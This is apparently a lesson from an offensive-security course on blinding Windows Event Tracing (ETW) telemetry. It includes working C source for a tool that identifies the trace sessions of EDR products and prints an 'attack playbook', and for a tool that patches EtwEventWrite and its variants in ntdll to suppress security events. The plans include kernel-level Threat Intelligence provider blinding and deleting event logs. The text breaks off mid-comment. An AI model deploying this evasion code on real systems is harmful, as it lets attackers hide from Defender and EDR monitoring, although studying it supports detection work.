## Day 6: ETW Manipulation and Telemetry Blinding

- **Goal**: Understand Event Tracing for Windows (ETW) architecture and learn to blind, tamper with, and abuse the telemetry pipeline that feeds EDR, Defender, and SIEM.
- **Activities**:
  - _Reading_:
    - [Microsoft - ETW Architecture](https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing)
    - [Matt Graeber - Subverting Sysmon](https://specterops.io/blog/) - ETW-based evasion research
    - [Adam Chester - Hiding Your .NET ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw/) - .NET ETW patching
    - [Palantir - Tampering with Windows Event Tracing](https://blog.palantir.com/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63) - Comprehensive ETW tampering guide
    - [Binarly - ETW Internals](https://www.binarly.io/blog/design-issues-of-modern-edrs-bypassing-etw-based-solutions) - Deep ETW kernel internals
  - _Online Resources_:
    - [Introduction to ETW](https://www.youtube.com/watch?v=-i_xAF7JqyA)
    - [Silent Intruders](https://www.youtube.com/watch?v=0FDZGIcAMPQ)
    - [Live Off the .NET Gadgets](https://www.youtube.com/watch?v=U_mVcJ8oOtE)

ETW is the **nervous system** of Windows telemetry. Every security product - Defender, CrowdStrike, SentinelOne, Sysmon - depends on ETW events. If you can blind ETW, you blind the entire defensive stack.

### Context: ETW in the Security Stack

```text
┌─────────────────────────────────────────────────────────────────┐
│              ETW in the Windows Security Pipeline               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  YOUR CODE EXECUTES                                             │
│       │                                                         │
│       ▼                                                         │
│  ┌─────────────────┐     ┌─────────────────────────────┐        │
│  │ ETW Providers   │  -> │ ETW Tracing Sessions        │        │
│  │ (Instrumented   │     │ (Kernel buffers)            │        │
│  │  in OS/Runtime) │     └──────────┬──────────────────┘        │
│  └─────────────────┘                │                           │
│                                     ▼                           │
│  Key Providers:              ┌──────────────────┐               │
│  ├─ Microsoft-Windows-       │ ETW Consumers    │               │
│  │  Threat-Intelligence      │ (Real-time)      │               │
│  │  (kernel, PPL-protected)  ├──────────────────┤               │
│  ├─ Microsoft-Windows-       │ - Defender ATP   │               │
│  │  DotNETRuntime            │ - CrowdStrike    │               │
│  ├─ Microsoft-Windows-       │ - SentinelOne    │               │
│  │  PowerShell               │ - Sysmon         │               │
│  ├─ Microsoft-Windows-       │ - Event Log Svc  │               │
│  │  Kernel-Process           │ - Custom SIEM    │               │
│  ├─ Microsoft-Windows-       └──────────────────┘               │
│  │  Kernel-Registry                                             │
│  └─ Microsoft-Windows-                                          │
│     Security-Auditing                                           │
│                                                                 │
│  ATTACK SURFACE:                                                │
│  ├─ Provider registration patches (usermode)                    │
│  ├─ Consumer session tampering                                  │
│  ├─ Event log manipulation                                      │
│  ├─ Kernel ETW structure corruption                             │
│  └─ Trace session hijacking                                     │
│                                                                 │
│  WEEK 7 DAY 6 vs DAY 3 (PPL):                                   │
│  Day 3 bypassed PPL to reach LSASS/Defender processes           │
│  Day 6 disables the TELEMETRY those processes generate          │
│  Both blind the defender - different layer                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Deliverables

- [ ] Map ETW providers consumed by at least 2 security products
- [ ] Patch a usermode ETW provider to suppress .NET assembly load events
- [ ] Blind the Threat Intelligence ETW provider (kernel-level)
- [ ] Tamper with Windows Event Log to remove specific entries
- [ ] Build a modular ETW blinding tool

### ETW Architecture Deep Dive

```c
// etw_architecture.c
// Compile: cl src\etw_architecture.c /Fe:bin\etw_architecture.exe advapi32.lib tdh.lib

#include <windows.h>
#include <evntrace.h>
#include <tdh.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "tdh.lib")

/*
ETW Architecture - Three Components:
═════════════════════════════════════

1. PROVIDERS - Generate events
   Registration: EventRegister() -> NtTraceControl (syscall)
   Kernel struct: _ETW_REG_ENTRY -> _ETW_GUID_ENTRY

2. SESSIONS (Controllers) - Collect events in kernel buffers
   Max 64 sessions. Each subscribes to providers via EnableTraceEx2().

3. CONSUMERS - Read events (real-time or .etl files)
   Defender/EDR = real-time consumers.

ATTACK VECTORS:
   [A] Patch Provider: ntdll!EtwEventWrite -> xor rax,rax; ret
   [B] Kill Session:   ControlTrace(EVENT_TRACE_CONTROL_STOP)
   [C] Blind Consumer: Reduce session buffer / disable keywords
   [D] Kernel patch:   Zero _TRACE_ENABLE_INFO.IsEnabled
*/

// Security-critical provider GUIDs we want to flag
static const struct { GUID guid; const char* name; const char* risk; } g_secProviders[] = {
    { {0xF4E1897C,0xBB5D,0x5668,{0xF1,0xD8,0x04,0x0F,0x4D,0x8D,0xD3,0x44}},
      "Microsoft-Windows-Threat-Intelligence",
      "CRITICAL - kernel memory ops, PPL-protected consumer" },
    { {0xE13C0D23,0xCCBC,0x4E12,{0x93,0x1B,0xD9,0xCC,0x2E,0xEE,0x27,0xE4}},
      ".NET Runtime",
      "HIGH - assembly loads, JIT, used by Defender" },
    { {0xA0C1853B,0x5C40,0x4B15,{0x87,0x66,0x3C,0xF1,0xC5,0x8F,0x98,0x5A}},
      "Microsoft-Windows-PowerShell",
      "HIGH - script block logging, module loads" },
    { {0x22FB2CD6,0x0E7B,0x422B,{0xA0,0xC7,0x2F,0xAD,0x1F,0xD0,0xE7,0x16}},
      "Microsoft-Windows-Kernel-Process",
      "MEDIUM - process creation/termination" },
    { {0x0CCE985F,0x223A,0x4A15,{0xB5,0xCD,0xDB,0x3B,0x65,0xC7,0xB7,0xBA}},
      "Microsoft-Windows-Kernel-File",
      "MEDIUM - file I/O telemetry" },
};

// ── Enumerate ALL active ETW tracing sessions ───────────────

void EnumerateActiveSessions() {
    printf("=== Active ETW Tracing Sessions ===\n\n");

    // QueryAllTraces returns all active sessions on the system
    PEVENT_TRACE_PROPERTIES pSessions[64];
    ULONG sessionCount = 0;
    ULONG bufSize = sizeof(EVENT_TRACE_PROPERTIES) + 1024;  // name buffer

    for (int i = 0; i < 64; i++) {
        pSessions[i] = (PEVENT_TRACE_PROPERTIES)calloc(1, bufSize);
        pSessions[i]->Wnode.BufferSize = bufSize;
        pSessions[i]->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
        pSessions[i]->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + 512;
    }

    ULONG status = QueryAllTracesA(pSessions, 64, &sessionCount);
    if (status != ERROR_SUCCESS) {
        printf("[-] QueryAllTraces failed: %lu\n", status);
        printf("    Requires admin for full enumeration\n");
        // Even non-admin can see some sessions
    }

    printf("  Active sessions: %lu / 64 max\n\n", sessionCount);
    printf("  %-4s %-40s %-10s %-8s %s\n",
           "ID", "Session Name", "Buffers", "Lost", "Flags");
    printf("  %-4s %-40s %-10s %-8s %s\n",
           "--", "------------", "-------", "----", "-----");

    for (ULONG i = 0; i < sessionCount; i++) {
        char* sessionName = (char*)pSessions[i] + pSessions[i]->LoggerNameOffset;
        BOOL isSecurityRelevant = FALSE;

        // Flag sessions that look security-related
        if (strstr(sessionName, "Defend") || strstr(sessionName, "defend") ||
            strstr(sessionName, "EventLog") || strstr(sessionName, "DiagTrack") ||
            strstr(sessionName, "Threat") || strstr(sessionName, "Sentinel") ||
            strstr(sessionName, "CrowdStrike") || strstr(sessionName, "Falcon") ||
            strstr(sessionName, "Carbon") || strstr(sessionName, "Sysmon") ||
            strstr(sessionName, "Elastic") || strstr(sessionName, "SIEM")) {
            isSecurityRelevant = TRUE;
        }

        printf("  %-4lu %s%-40s%s %-10lu %-8lu 0x%04X\n",
               i,
               isSecurityRelevant ? "[!] " : "    ",
               sessionName,
               isSecurityRelevant ? " <-- SECURITY" : "",
               pSessions[i]->NumberOfBuffers,
               pSessions[i]->EventsLost,
               pSessions[i]->EnableFlags);

        if (isSecurityRelevant) {
            printf("        -> Buffer size: %lu KB, Min buffers: %lu\n",
                   pSessions[i]->BufferSize, pSessions[i]->MinimumBuffers);
            printf("        -> ATTACK: ControlTrace(STOP) or reduce BufferSize\n");
        }
    }

    for (int i = 0; i < 64; i++) free(pSessions[i]);
}

// ── Enumerate registered ETW providers via TDH ──────────────

void EnumerateSecurityProviders() {
    printf("\n=== Registered ETW Providers (Security-Relevant) ===\n\n");

    DWORD bufSize = 0;
    DWORD status = TdhEnumerateProviders(NULL, &bufSize);
    if (status != ERROR_INSUFFICIENT_BUFFER) {
        printf("[-] TdhEnumerateProviders failed: %lu\n", status);
        return;
    }

    PPROVIDER_ENUMERATION_INFO pProviders = (PPROVIDER_ENUMERATION_INFO)malloc(bufSize);
    status = TdhEnumerateProviders(pProviders, &bufSize);
    if (status != ERROR_SUCCESS) {
        printf("[-] TdhEnumerateProviders failed: %lu\n", status);
        free(pProviders);
        return;
    }

    printf("  Total registered providers: %lu\n\n", pProviders->NumberOfProviders);

    // Search for our security-critical providers
    int foundCount = 0;
    for (DWORD i = 0; i < pProviders->NumberOfProviders; i++) {
        PTRACE_PROVIDER_INFO pInfo = &pProviders->TraceProviderInfoArray[i];

        for (int s = 0; s < _countof(g_secProviders); s++) {
            if (IsEqualGUID(&pInfo->ProviderGuid, &g_secProviders[s].guid)) {
                wchar_t* provName = (wchar_t*)((BYTE*)pProviders +
                                    pInfo->ProviderNameOffset);
                printf("  [%d] %ls\n", ++foundCount, provName);
                printf("      GUID: {%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\n",
                       pInfo->ProviderGuid.Data1,
                       pInfo->ProviderGuid.Data2,
                       pInfo->ProviderGuid.Data3,
                       pInfo->ProviderGuid.Data4[0], pInfo->ProviderGuid.Data4[1],
                       pInfo->ProviderGuid.Data4[2], pInfo->ProviderGuid.Data4[3],
                       pInfo->ProviderGuid.Data4[4], pInfo->ProviderGuid.Data4[5],
                       pInfo->ProviderGuid.Data4[6], pInfo->ProviderGuid.Data4[7]);
                printf("      Risk: %s\n\n", g_secProviders[s].risk);
                break;
            }
        }
    }

    // Also count total providers for attack surface assessment
    int kernelProviders = 0, userProviders = 0;
    for (DWORD i = 0; i < pProviders->NumberOfProviders; i++) {
        if (pProviders->TraceProviderInfoArray[i].SchemaSource == 0)
            userProviders++;
        else
            kernelProviders++;
    }
    printf("  Provider distribution: ~%d manifest-based, ~%d other\n",
           userProviders, kernelProviders);

    free(pProviders);
}

// ── Check if EtwEventWrite is already patched ───────────────

void CheckEtwPatchStatus() {
    printf("\n=== EtwEventWrite Integrity Check ===\n\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] ntdll not loaded?!\n");
        return;
    }

    BYTE* pEtwWrite = (BYTE*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwWrite) {
        printf("[-] EtwEventWrite not found\n");
        return;
    }

    printf("  EtwEventWrite @ 0x%p\n", pEtwWrite);
    printf("  First 16 bytes: ");
    for (int i = 0; i < 16; i++)
        printf("%02X ", pEtwWrite[i]);
    printf("\n");

    // Known patch signatures
    // xor rax,rax; ret = 48 33 C0 C3  or  48 31 C0 C3
    // ret = C3
    BOOL patched = FALSE;
    if (pEtwWrite[0] == 0x48 &&
        (pEtwWrite[1] == 0x33 || pEtwWrite[1] == 0x31) &&
        pEtwWrite[2] == 0xC0 && pEtwWrite[3] == 0xC3) {
        printf("  [!] PATCHED: xor rax,rax; ret detected!\n");
        printf("      ETW events from this process are SUPPRESSED\n");
        patched = TRUE;
    } else if (pEtwWrite[0] == 0xC3) {
        printf("  [!] PATCHED: immediate ret detected!\n");
        patched = TRUE;
    }

    if (!patched) {
        printf("  [+] EtwEventWrite appears INTACT (not patched)\n");

        // Also check for hooks (JMP to trampoline)
        if (pEtwWrite[0] == 0xE9 || pEtwWrite[0] == 0xFF) {
            printf("  [?] But starts with JMP/CALL - possible EDR hook\n");
            printf("      This is DEFENSIVE hooking (EDR monitoring calls)\n");
        }
    }

    // Also check EtwEventWriteEx and EtwEventWriteFull
    BYTE* pWriteEx = (BYTE*)GetProcAddress(hNtdll, "EtwEventWriteEx");
    BYTE* pWriteFull = (BYTE*)GetProcAddress(hNtdll, "EtwEventWriteFull");
    if (pWriteEx) {
        printf("\n  EtwEventWriteEx @ 0x%p - ", pWriteEx);
        if (pWriteEx[0] == 0x48 && pWriteEx[2] == 0xC0 && pWriteEx[3] == 0xC3)
            printf("PATCHED\n");
        else
            printf("intact\n");
    }
    if (pWriteFull) {
        printf("  EtwEventWriteFull @ 0x%p - ", pWriteFull);
        if (pWriteFull[0] == 0x48 && pWriteFull[2] == 0xC0 && pWriteFull[3] == 0xC3)
            printf("PATCHED\n");
        else
            printf("intact\n");
    }
}

// ── Identify EDR/security sessions for targeted blinding ────

void IdentifyEDRSessions() {
    printf("\n=== EDR Session Identification ===\n\n");

    // Known EDR session name patterns
    const char* edrPatterns[] = {
        "Defender", "MsMpEng", "WinDefend", "SenseIR", "MsSense",
        "MpWpp",  // Windows Defender WPP tracing sessions
        "CrowdStrike", "Falcon", "CSFalcon",
        "SentinelOne", "Sentinel",
        "CarbonBlack", "Cb Defense",
        "Cylance",
        "Elastic", "Winlogbeat",
        "Sysmon",
        "DiagTrack",
        NULL
    };

    PEVENT_TRACE_PROPERTIES pSessions[64];
    ULONG sessionCount = 0, bufSize = sizeof(EVENT_TRACE_PROPERTIES) + 1024;

    for (int i = 0; i < 64; i++) {
        pSessions[i] = (PEVENT_TRACE_PROPERTIES)calloc(1, bufSize);
        pSessions[i]->Wnode.BufferSize = bufSize;
        pSessions[i]->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
        pSessions[i]->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + 512;
    }

    if (QueryAllTracesA(pSessions, 64, &sessionCount) == ERROR_SUCCESS) {
        for (ULONG i = 0; i < sessionCount; i++) {
            char* name = (char*)pSessions[i] + pSessions[i]->LoggerNameOffset;
            for (int p = 0; edrPatterns[p]; p++) {
                if (strstr(name, edrPatterns[p])) {
                    printf("  [!] EDR SESSION: %s\n", name);
                    printf("      Handle: %llu\n",
                           pSessions[i]->Wnode.HistoricalContext);
                    printf("      Buffers: %lu (size: %lu KB)\n",
                           pSessions[i]->NumberOfBuffers,
                           pSessions[i]->BufferSize);
                    printf("      Events lost: %lu\n",
                           pSessions[i]->EventsLost);
                    printf("      ATTACK OPTIONS:\n");
                    printf("        - ControlTrace(STOP) [requires SYSTEM]\n");
                    printf("        - Reduce BufferSize to cause event loss\n");
                    printf("        - Flush buffers to .etl then delete\n\n");
                    break;
                }
            }
        }
    }

    for (int i = 0; i < 64; i++) free(pSessions[i]);
}

int main() {
    printf("----------------------------------------\n");
    printf("ETW Offensive Reconnaissance Tool\n");
    printf("----------------------------------------\n\n");

    EnumerateActiveSessions();
    EnumerateSecurityProviders();
    CheckEtwPatchStatus();
    IdentifyEDRSessions();

    printf("\n----------------------------------------\n");
    printf("ATTACK PLAYBOOK:\n");
    printf("  1. Patch EtwEventWrite in YOUR process (4 bytes)\n");
    printf("  2. Patch EtwEventWriteEx too (some EDRs use it)\n");
    printf("  3. For .NET: patch before CLR loads assemblies\n");
    printf("  4. For PowerShell: patch before script execution\n");
    printf("  5. TI ETW: requires kernel R/W (BYOVD/exploit)\n");
    printf("  6. Event Log: Phant0m technique (suspend threads)\n");
    printf("----------------------------------------\n");

    return 0;
}
```

**Compile and Run**:

```bash
cl src\etw_architecture.c /Fe:bin\etw_architecture.exe advapi32.lib tdh.lib
# run as admin:
.\bin\etw_architecture.exe
```

### ETW Bypass

see if any of the following methods actually work

#### Technique 1: Usermode ETW Provider Patching

```c
// etw_patch.c - Patch ETW provider registration to suppress events
// Compile: cl src\etw_patch.c /Fe:bin\etw_patch.exe advapi32.lib

#include <windows.h>
#include <evntrace.h>
#include <evntprov.h>
#include <stdio.h>
#include <psapi.h>
#include <time.h>

#pragma comment(lib, "advapi32.lib")

/*
TECHNIQUE: Patch ntdll!EtwEventWrite
═════════════════════════════════════

When a .NET assembly loads, the CLR calls:
  clr!ETW::CEtwTracer::EmitEvent()
    -> ntdll!EtwEventWrite()
      -> NtTraceControl() [syscall]

If we patch EtwEventWrite to return immediately (ret 0),
NO ETW events from this process reach any consumer.

This blinds:
  ├── .NET assembly load events (Defender)
  ├── PowerShell script block logging
  ├── Process activity telemetry
  └── Any usermode ETW from this process

LIMITATION: Only affects OUR process. Other processes
still generate events. Kernel providers unaffected.

NOTE: Modern EDRs increasingly rely on kernel ETW providers
which bypass this technique. Still effective against usermode telemetry.

PRIVILEGE REQUIREMENTS:
  - NO admin required for patching (modifying own process memory)
  - Admin MAY be required to view ETW sessions for verification
  - The patch itself works as regular user
*/

// Store original bytes for restoration
BYTE g_originalEtwEventWrite[16] = {0};
BYTE g_originalEtwEventWriteEx[16] = {0};
BYTE g_originalEtwEventWriteFull[16] = {0};

BOOL PatchEtwFunction(const char* funcName, BYTE* originalBytes) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    FARPROC pFunc = GetProcAddress(hNtdll, funcName);
    if (!pFunc) {
        printf("[-] Failed to get %s address\n", funcName);
        return FALSE;
    }

    printf("[*] %s @ 0x%p\n", funcName, pFunc);

    // Save original bytes for restoration
    memcpy(originalBytes, pFunc, 16);

    // Display original bytes
    printf("    Original bytes: ");
    for (int i = 0; i < 16; i++) {
        printf("%02X ", originalBytes[i]);
    }
    printf("\n");

    // Patch: xor rax, rax; ret (return STATUS_SUCCESS = 0)
    // This makes every ETW event call succeed silently without writing
    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };  // xor rax, rax; ret

    DWORD oldProtect;
    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    memcpy(pFunc, patch, sizeof(patch));

    if (!VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect)) {
        printf("[-] VirtualProtect restore failed: %d\n", GetLastError());
    }

    // Verify patch
    BYTE verify[4];
    memcpy(verify, pFunc, 4);
    if (memcmp(verify, patch, 4) == 0) {
        printf("[+] %s patched successfully\n", funcName);
        return TRUE;
    } else {
        printf("[-] %s patch verification failed\n", funcName);
        return FALSE;
    }
}

BOOL PatchEtwEventWrite() {
    printf("\n=== Patching EtwEventWrite Functions ===\n\n");

    BOOL success = TRUE;

    // Patch main EtwEventWrite
    if (!PatchEtwFunction("EtwEventWrite", g_originalEtwEventWrite)) {
        success = FALSE;
    }

    // Patch EtwEventWriteEx (used by some providers)
    if (!PatchEtwFunction("EtwEventWriteEx", g_originalEtwEventWriteEx)) {
        printf("[!] EtwEventWriteEx patch failed (may not exist on this system)\n");
    }

    // Patch EtwEventWriteFull (comprehensive variant)
    if (!PatchEtwFunction("EtwEventWriteFull", g_originalEtwEventWriteFull)) {
        printf("[!] EtwEventWriteFull patch failed (may not exist on this system)\n");
    }

    return success;
}

BOOL RestoreEtwFunction(const char* funcName, BYTE* originalBytes) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pFunc = GetProcAddress(hNtdll, funcName);
    if (!pFunc) return FALSE;

    DWORD oldProtect;
    if (!VirtualProtect(pFunc, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    memcpy(pFunc, originalBytes, 16);
    VirtualProtect(pFunc, 16, oldProtect, &oldProtect);

    printf("[+] %s restored to original state\n", funcName);
    return TRUE;
}

BOOL RestoreEtwEventWrite() {
    printf("\n=== Restoring Original ETW Functions ===\n\n");

    RestoreEtwFunction("EtwEventWrite", g_originalEtwEventWrite);
    RestoreEtwFunction("EtwEventWriteEx", g_originalEtwEventWriteEx);
    RestoreEtwFunction("EtwEventWriteFull", g_originalEtwEventWriteFull);

    return TRUE;
}

/*
TECHNIQUE: Test ETW suppression with real events AND verify via logman
═══════════════════════════════════════════════════════════════════════

Register a test provider and emit events before/after patching.
Then use logman to create a trace session and verify events are suppressed.
*/

// Test provider GUID: {12345678-1234-1234-1234-123456789012}
static const GUID TestProviderGuid =
    { 0x12345678, 0x1234, 0x1234, { 0x12, 0x34, 0x12, 0x34, 0x56, 0x78, 0x90, 0x12 } };

void StartEtwTraceSession() {
    printf("\n[*] Attempting to start ETW trace session...\n");
    printf("    (Requires admin - will fail silently if not admin)\n");

    int result = system("logman create trace TestTrace -p {12345678-1234-1234-1234-123456789012} -o test.etl -ets >nul 2>&1");

    if (result == 0) {
        printf("[+] Trace session started successfully\n");
        printf("    Events will be captured to test.etl\n");
    } else {
        printf("[!] Trace session creation failed (likely not admin)\n");
        printf("    Test will continue without trace verification\n");
    }
}

void StopEtwTraceSession() {
    printf("\n[*] Stopping ETW trace session...\n");
    int result = system("logman stop TestTrace -ets >nul 2>&1");
    if (result == 0) {
        printf("[+] Trace session stopped\n");

        // Check if test.etl exists
        FILE* f = fopen("test.etl", "rb");
        if (f) {
            fclose(f);
            printf("\n[+] test.etl file created successfully!\n");
            printf("    To view events:\n");
            printf("      tracerpt test.etl -o test.xml -of XML\n");
            printf("      notepad test.xml\n");
        } else {
            printf("[!] test.etl not found (trace session may not have started)\n");
        }
    }
}

BOOL TestEtwSuppression() {
    printf("\n=== Testing ETW Event Suppression ===\n\n");

    REGHANDLE hProvider = 0;
    ULONG result;

    // Start trace session (requires admin, but won't fail if not admin)
    StartEtwTraceSession();
    Sleep(500);  // Give session time to start

    // Register test provider
    result = EventRegister(&TestProviderGuid, NULL, NULL, &hProvider);
    if (result != ERROR_SUCCESS) {
        printf("[-] EventRegister failed: %lu\n", result);
        return FALSE;
    }

    printf("[+] Test provider registered (handle: 0x%llx)\n", (ULONGLONG)hProvider);

    // Emit test event BEFORE patching
    printf("\n[*] Emitting 5 test events BEFORE patch...\n");
    EVENT_DESCRIPTOR eventDesc = {0};
    eventDesc.Id = 1;
    eventDesc.Level = TRACE_LEVEL_INFORMATION;

    for (int i = 0; i < 5; i++) {
        result = EventWrite(hProvider, &eventDesc, 0, NULL);
        printf("    Event %d: EventWrite returned %lu\n", i+1, result);
        Sleep(100);
    }

    // Now patch ETW
    printf("\n[*] Applying ETW patch...\n");
    PatchEtwEventWrite();

    // Emit test event AFTER patching
    printf("\n[*] Emitting 5 test events AFTER patch...\n");
    for (int i = 0; i < 5; i++) {
        result = EventWrite(hProvider, &eventDesc, 0, NULL);
        printf("    Event %d: EventWrite returned %lu (but NOT written!)\n", i+1, result);
        Sleep(100);
    }

    // Cleanup
    EventUnregister(hProvider);
    StopEtwTraceSession();

    printf("\n[+] Test complete!\n");
    printf("\n");
    printf("VERIFICATION:\n");

    // Check if test.etl exists
    FILE* testFile = fopen("test.etl", "rb");
    if (testFile) {
        fclose(testFile);
        printf("  [+] test.etl file found!\n");
        printf("      To view captured events:\n");
        printf("        tracerpt test.etl -o test.xml -of XML\n");
        printf("        notepad test.xml\n");
        printf("      You should see:\n");
        printf("        - 5 events BEFORE the patch\n");
        printf("        - 0 events AFTER the patch\n");
        printf("      This proves ETW was successfully blinded!\n");
    } else {
        printf("  [!] test.etl not found (trace session requires admin)\n");
        printf("      But the patch still worked! The EventWrite calls\n");
        printf("      returned success but events were silently dropped.\n");
        printf("\n");
        printf("      To verify with admin privileges:\n");
        printf("        1. Run this tool as administrator\n");
        printf("        2. Check test.etl file for proof\n");
    }

    return TRUE;
}

/*
TECHNIQUE: Scan for .NET CLR and patch its ETW
═══════════════════════════════════════════════

Target: Microsoft-Windows-DotNETRuntime provider
Goal:   Hide .NET assembly loads from Defender
*/

// .NET Runtime provider GUID: {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
static const GUID DotNetRuntimeGuid =
    { 0xE13C0D23, 0xCCBC, 0x4E12, { 0x93, 0x1B, 0xD9, 0xCC, 0x2E, 0xEE, 0x27, 0xE4 } };

BOOL FindAndPatchDotNetETW() {
    printf("\n=== Scanning for .NET Runtime ETW ===\n\n");

    // Check if CLR is loaded
    HMODULE hClr = GetModuleHandleA("clr.dll");
    if (!hClr) {
        hClr = GetModuleHandleA("coreclr.dll");
    }
    if (!hClr) {
        hClr = GetModuleHandleA("clrjit.dll");
    }

    if (!hClr) {
        printf("[!] .NET CLR not loaded in this process\n");
        printf("    This is normal if not running .NET code\n");
        printf("    For .NET processes, patch BEFORE loading assemblies\n");
        return FALSE;
    }

    printf("[+] CLR module found @ 0x%p\n", hClr);

    // Get module info
    MODULEINFO modInfo;
    if (GetModuleInformation(GetCurrentProcess(), hClr, &modInfo, sizeof(modInfo))) {
        printf("    Base: 0x%p, Size: %lu bytes\n",
               modInfo.lpBaseOfDll, modInfo.SizeOfImage);
    }

    printf("\n[*] Strategy: Patching EtwEventWrite covers ALL providers\n");
    printf("    including .NET Runtime, PowerShell, and custom providers\n");
    printf("    No need to find specific CLR ETW handles\n");

    return TRUE;
}

/*
TECHNIQUE: Verify patch status
═══════════════════════════════

Check if ETW functions are currently patched.
*/

BOOL VerifyPatchStatus() {
    printf("\n=== Verifying ETW Patch Status ===\n\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    const char* functions[] = {
        "EtwEventWrite",
        "EtwEventWriteEx",
        "EtwEventWriteFull"
    };

    BYTE patchSig[] = { 0x48, 0x33, 0xC0, 0xC3 };  // xor rax,rax; ret

    for (int i = 0; i < 3; i++) {
        FARPROC pFunc = GetProcAddress(hNtdll, functions[i]);
        if (!pFunc) continue;

        BYTE bytes[4];
        memcpy(bytes, pFunc, 4);

        BOOL isPatched = (memcmp(bytes, patchSig, 4) == 0);

        printf("  %-20s @ 0x%p - %s\n",
               functions[i],
               pFunc,
               isPatched ? "[PATCHED]" : "[INTACT]");

        if (!isPatched) {
            printf("    First 4 bytes: %02X %02X %02X %02X\n",
                   bytes[0], bytes[1], bytes[2], bytes[3]);
        }
    }

    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("ETW Provider Patching - Telemetry Blind\n");
    printf("========================================\n");

    printf("\nPRIVILEGE INFO:\n");
    printf("  - Patching ETW: NO admin required (own process memory)\n");
    printf("  - Trace verification: Admin helpful but not required\n\n");

    // Show current status
    VerifyPatchStatus();

    // Test ETW suppression
    TestEtwSuppression();

    // Check for .NET
    FindAndPatchDotNetETW();

    printf("\n========================================\n");
    printf("SUMMARY:\n");
    printf("  ETW patching demonstrated successfully!\n");
    printf("  Check test.etl to verify 5 events before patch, 0 after.\n");
    printf("\n");
    printf("LIMITATIONS:\n");
    printf("  - Only affects usermode ETW in this process\n");
    printf("  - Kernel ETW providers still report activity\n");
    printf("  - Modern EDRs use kernel providers (harder to blind)\n");
    printf("  - Process creation still visible via Kernel-Process provider\n");
    printf("========================================\n");

    return 0;
}
```

```bash
cl src\etw_patch.c /Fe:bin\etw_patch.exe advapi32.lib
# run as admin
.\bin\etw_patch.exe
tracerpt test.etl -summary summary.txt
type summary.txt
tracerpt test.etl -o test.xml -of XML
notepad .\test.xml
```

#### Technique 2: Threat Intelligence ETW Provider

```text
┌─────────────────────────────────────────────────────────────────┐
│     Microsoft-Windows-Threat-Intelligence ETW Provider          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  THE MOST SECURITY-CRITICAL ETW PROVIDER                        │
│                                                                 │
│  GUID: {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}                   │
│                                                                 │
│  What it monitors:                                              │
│  ├── NtAllocateVirtualMemory (RWX allocations)                  │
│  ├── NtProtectVirtualMemory  (RW->RX transitions)               │
│  ├── NtMapViewOfSection      (section mapping)                  │
│  ├── NtWriteVirtualMemory    (remote writes)                    │
│  ├── NtQueueApcThread        (APC injection)                    │
│  └── Process/thread creation from kernel                        │
│                                                                 │
│  WHY IT MATTERS:                                                │
│  ├── Fires from KERNEL MODE (can't patch from usermode!)        │
│  ├── Only PPL-protected processes can consume it                │
│  ├── Defender ATP relies on this for memory detection           │
│  ├── CrowdStrike/SentinelOne kernel drivers consume it          │
│  └── Detects shellcode injection, reflective loading, etc       │
│                                                                 │
│  ATTACK DIFFICULTY:                                             │
│  ├── Usermode patch: IMPOSSIBLE (kernel provider)               │
│  ├── Kernel patch:   Requires driver load (BYOVD? PPL bypass?)  │
│  ├── Disable session: Requires SYSTEM + knowledge of session    │
│  └── Avoid triggers:  Use syscalls that don't fire TI events    │
│                                                                 │
│  UPDATE:                                                        │
│  ├── Post-CrowdStrike incident, Microsoft moving EDRs to        │
│  │   usermode with ENHANCED kernel ETW reliance                 │
│  ├── TI ETW provider MORE critical than ever for detection      │
│  ├── Hardware breakpoint abuse now triggers TI events           │
│  └── Kernel access harder (VBS, HVCI more common)               │
│                                                                 │
│  WEEK 7 CONNECTION:                                             │
│  Day 3 (PPL) -> needed to protect TI consumers                  │
│  Day 6 (ETW) -> attacking what those consumers receive          │
│  If you bypassed PPL, you can disable the TI consumer           │
│  If you can't, you must blind the TI provider at kernel level   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

```c
// ti_etw_analysis.c - Analyze and demonstrate TI ETW evasion
// Compile: cl src\ti_etw_analysis.c /Fe:bin\ti_etw_analysis.exe advapi32.lib ntdll.lib

#include <windows.h>
#include <evntrace.h>
#include <evntcons.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

/*
THREAT INTELLIGENCE ETW - KERNEL SIDE
══════════════════════════════════════

The TI ETW provider is registered by the kernel itself:
  - nt!EtwThreatIntProvRegHandle stores the registration
  - Events fired inline in kernel memory management functions
  - Example: MiAllocateVirtualMemory -> EtwTiLogAllocExecVm

KERNEL STRUCTURES (via WinDbg):
  dt nt!_ETW_GUID_ENTRY
  dt nt!_ETW_REG_ENTRY
  dt nt!_TRACE_ENABLE_INFO

